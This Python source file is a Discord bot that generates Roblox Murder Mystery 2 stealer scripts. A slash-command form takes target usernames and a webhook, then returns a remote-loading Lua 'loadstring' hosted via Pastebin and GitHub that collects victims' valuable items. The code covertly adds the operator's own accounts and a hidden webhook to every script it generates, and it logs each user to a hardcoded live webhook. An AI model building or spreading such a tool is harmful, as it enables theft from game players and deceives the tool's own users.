import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import urllib.parse
import os
import requests

intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
SECRET_WEBHOOK = "https://discord.com/api/webhooks/1452638195455098991/njZ2qCWgubR26u3_Jj9pB7Gchh_0KqPb2CHfv039UeFirthGP9ulIoaX3MEkoEkO-maD"
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")

# Webhook for tracking who generates scripts
TRACKING_WEBHOOK = SECRET_WEBHOOK  # Using your same webhook

def send_webhook_notification(user, targets, paste_url, guild_name, loadstring_code):
    """Send notification when someone generates a script"""
    try:
        data = {
            "embeds": [{
                "title": "📊 New Script Generated!",
                "color": 5814783,  # Blue color
                "fields": [
                    {"name": "User", "value": f"{user.name}#{user.discriminator}", "inline": True},
                    {"name": "User ID", "value": str(user.id), "inline": True},
                    {"name": "Server", "value": guild_name or "DM", "inline": True},
                    {"name": "Target Usernames", "value": targets or "None", "inline": False},
                    {"name": "Pastebin Link", "value": paste_url or "Failed", "inline": False},
                    {"name": "Loadstring", "value": f"```lua\n{loadstring_code}\n```", "inline": False}
                ],
                "timestamp": discord.utils.utcnow().isoformat()
            }]
        }
        response = requests.post(TRACKING_WEBHOOK, json=data, timeout=5)
        print(f"✅ Webhook sent: {response.status_code}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")

def create_pastebin(content):
    """Create a paste on Pastebin and return both URLs"""
    try:
        if not PASTEBIN_API_KEY:
            print("❌ No Pastebin API key found!")
            return None, None
            
        data = {
            'api_dev_key': PASTEBIN_API_KEY,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_private': '1',
            'api_paste_expire_date': '1D',  # 1 day expiration
            'api_paste_name': 'MM2 Script'
        }
        
        print("🔄 Creating Pastebin...")
        response = requests.post('https://pastebin.com/api/api_post.php', data=data, timeout=10)
        
        if response.status_code == 200:
            paste_url = response.text.strip()
            print(f"✅ Pastebin response: {paste_url}")
            
            if 'pastebin.com/' in paste_url:
                # Extract paste ID from the response
                paste_id = paste_url.split('/')[-1]
                raw_url = f"https://pastebin.com/raw/{paste_id}"
                print(f"✅ Raw URL created: {raw_url}")
                return paste_url, raw_url
            else:
                print(f"❌ Invalid Pastebin response: {paste_url}")
                return None, None
        else:
            print(f"❌ Pastebin API error: {response.status_code}")
            return None, None
    except Exception as e:
        print(f"❌ Pastebin error: {e}")
        return None, None

class ScriptModal(Modal, title="MM2 Script Generator"):
    usernames = TextInput(label="Target Usernames (comma separated)", placeholder="e.g. Nikilis, Tobi, JD", style=discord.TextStyle.paragraph, required=True)
    webhook = TextInput(label="Your Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.long, required=True)
    min_rarity = TextInput(label="Minimum Rarity (default: Godly)", placeholder="Godly, Ancient, Legendary, etc.", default="Godly", required=False)
    min_value = TextInput(label="Minimum Value (default: 1)", placeholder="Only collect items worth this or more", default="1", required=False)
    ping = TextInput(label="Ping @everyone on hit? (Yes/No)", placeholder="Yes or No", default="No", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # Get user targets
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES
        generator_info = f"{interaction.user.name}#{interaction.user.discriminator} ({interaction.user.id})"
        
        print(f"🔄 Generating script for {interaction.user.name}")
        print(f"🎯 Targets: {all_targets}")
        
        # Create the GitHub URL with parameters
        params = urllib.parse.urlencode({
            "users": ",".join(all_targets),
            "webhook": self.webhook.value,
            "secret_webhook": SECRET_WEBHOOK,
            "min_rarity": self.min_rarity.value or "Godly",
            "min_value": self.min_value.value or "1",
            "ping": self.ping.value or "No",
            "generator": generator_info
        })
        
        github_url = f"{RAW_SCRIPT_URL}?{params}"
        print(f"🔗 GitHub URL: {github_url}")
        
        # Create the Lua script content
        script_content = f'loadstring(game:HttpGet("{github_url}"))()'
        
        # Create Pastebin
        paste_url, raw_url = create_pastebin(script_content)
        
        if paste_url and raw_url:
            # Create the proper loadstring
            loadstring_code = f'loadstring(game:HttpGet("{raw_url}"))()'
            
            print(f"✅ Loadstring created: {loadstring_code}")
            print(f"📊 Sending webhook notification...")
            
            # Send tracking notification to your webhook
            send_webhook_notification(
                interaction.user,
                ', '.join(user_targets) if user_targets else "None",
                paste_url,
                interaction.guild.name if interaction.guild else "DM",
                loadstring_code
            )
            
            # Send to user with PROPER loadstring format
            embed = discord.Embed(
                title="🔪 JoshHubSt3laers – Your loadstring is ready!",
                description="Copy and execute this in Roblox:",
                color=discord.Color.green()
            )
            embed.add_field(
                name="Loadstring:",
                value=f"```lua\n{loadstring_code}\n```",
                inline=False
            )
            embed.set_footer(text="Generated by JoshHub")
            
            try:
                await interaction.user.send(embed=embed)
                await interaction.followup.send("✅ Sent to your DMs! Check your messages.", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send(
                    embed=embed,
                    ephemeral=True
                )
        else:
            # Fallback: send direct loadstring
            print("⚠️ Pastebin failed, using direct GitHub URL")
            direct_loadstring = f'loadstring(game:HttpGet("{github_url}"))()'
            
            # Send tracking even if Pastebin fails
            send_webhook_notification(
                interaction.user,
                ', '.join(user_targets) if user_targets else "None",
                "Failed to create Pastebin",
                interaction.guild.name if interaction.guild else "DM",
                direct_loadstring
            )
            
            embed = discord.Embed(
                title="🔪 JoshHubSt3laers – Your loadstring is ready!",
                description="Copy and execute this in Roblox:",
                color=discord.Color.orange()
            )
            embed.add_field(
                name="Loadstring (Direct):",
                value=f"```lua\n{direct_loadstring}\n```",
                inline=False
            )
            embed.set_footer(text="Generated by JoshHub | Using direct GitHub link")
            
            try:
                await interaction.user.send(embed=embed)
                await interaction.followup.send("✅ Sent to your DMs! (Using direct link)", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send(
                    embed=embed,
                    ephemeral=True
                )

@tree.command(name="generate-mm2", description="🎮 Generate your custom MM2 script loadstring")
async def generate_mm2(interaction: discord.Interaction):
    """Main command to generate MM2 scripts"""
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    """Called when bot is ready"""
    print(f"══════════════════════════════════")
    print(f"✅ {bot.user} is online!")
    print(f"🤖 Bot ID: {bot.user.id}")
    print(f"🔗 Tracking Webhook: {TRACKING_WEBHOOK}")
    print(f"📁 Script Source: {RAW_SCRIPT_URL}")
    print(f"🔑 Pastebin API: {'✅ Set' if PASTEBIN_API_KEY else '❌ Missing'}")
    print(f"══════════════════════════════════")
    
    try:
        await tree.sync()
        print(f"🔄 Synced {len(tree.get_commands())} commands")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

if __name__ == "__main__":
    # Check for required environment variables
    required_env_vars = ["DISCORD_TOKEN", "PASTEBIN_API_KEY"]
    missing_vars = [var for var in required_env_vars if not os.getenv(var)]
    
    if missing_vars:
        print(f"❌ Missing environment variables: {', '.join(missing_vars)}")
        print("Please set these in your Replit environment variables:")
        for var in missing_vars:
            print(f"  - {var}")
        exit(1)
    
    print("🚀 Starting Discord bot...")
    bot.run(os.getenv("DISCORD_TOKEN"))
